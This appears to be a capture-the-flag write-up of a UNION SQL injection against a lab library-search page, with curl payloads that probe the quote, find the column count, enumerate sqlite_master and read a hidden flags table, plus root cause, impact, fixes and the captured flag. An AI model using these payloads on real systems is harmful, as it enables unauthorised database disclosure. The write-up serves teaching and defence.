# Public Library UNION SQL Injection

## What Is Happening

The [Public Library lab](https://19e9c10a5d6c.pwnbox-lab.com/) exposes a title search at `GET /?q=...`. The page claims the query only returns book records, while the flag supposedly lives in a separate admin table.

In practice, the search input is concatenated into SQL and the response renders database errors and query results directly into the page.

## Why It Happens

The `q` parameter is used in a quoted SQL string without parameterization. A stray quote causes a SQLite parser error:

```text
unrecognized token: "'"
```

Once the quote is closed, `UNION SELECT` can append attacker-controlled rows to the normal `books` result set.

The result table has **2 columns**, so the injected query must also return 2 columns.

## Exploit Chain

1. Confirm string-literal injection with `'`.
2. Determine `UNION` column count.
3. Enumerate SQLite schema through `sqlite_master`.
4. Read the hidden `flags` table.

## Exact Test

Quote probe:

```bash
curl -sS "https://19e9c10a5d6c.pwnbox-lab.com/?q=%27"
```

Projection width proof:

```bash
curl -sS "https://19e9c10a5d6c.pwnbox-lab.com/?q=%27%20UNION%20SELECT%201,2--"
```

Schema enumeration:

```bash
curl -sS "https://19e9c10a5d6c.pwnbox-lab.com/?q=%27%20UNION%20SELECT%20sql,%20%27x%27%20FROM%20sqlite_master%20WHERE%20type=%27table%27--"
```

Flag extraction:

```bash
curl -sS "https://19e9c10a5d6c.pwnbox-lab.com/?q=%27%20UNION%20SELECT%20value,%20%27x%27%20FROM%20flags--"
```

## Expected Signal

- A stray quote returns a SQLite syntax error.
- `UNION SELECT 1,2--` adds a visible row `1 | 2`.
- `UNION SELECT 1,2,3--` fails due to column-count mismatch.
- `sqlite_master` reveals a hidden `flags` table.
- `flags.value` appears in the visible table.

## Result Interpretation

Confirmed bug chain:

```text
Unsafely concatenated search string
-> quote breakout
-> 2-column UNION injection
-> sqlite_master enumeration
-> hidden flags table read
-> flag reflected in search results
```

## Root Cause

Raw user input was concatenated into a SQL search string, and the app trusted the base query shape as if it enforced data isolation.

## Impact

- Disclosure of hidden tables and arbitrary rows readable by the DB connection.
- Schema enumeration through `sqlite_master`.
- In real systems, exposure of admin data, user data, or secrets stored in the same database.

## Fix

- Use prepared statements for search queries.
- Do not return raw SQL errors to users.
- Restrict the DB account so public search cannot read sensitive tables.
- Consider isolating admin/secret tables from public catalog data.

## Key Lesson

When an app says a search query "only returns records from one table," test whether that guarantee exists in SQL or only in the developer's mental model. `UNION` often breaks that assumption immediately.

## Flag

`pwnbox{c2e4f6a8b0d2e4f6a8b0c2d4e6f8a0b2}`
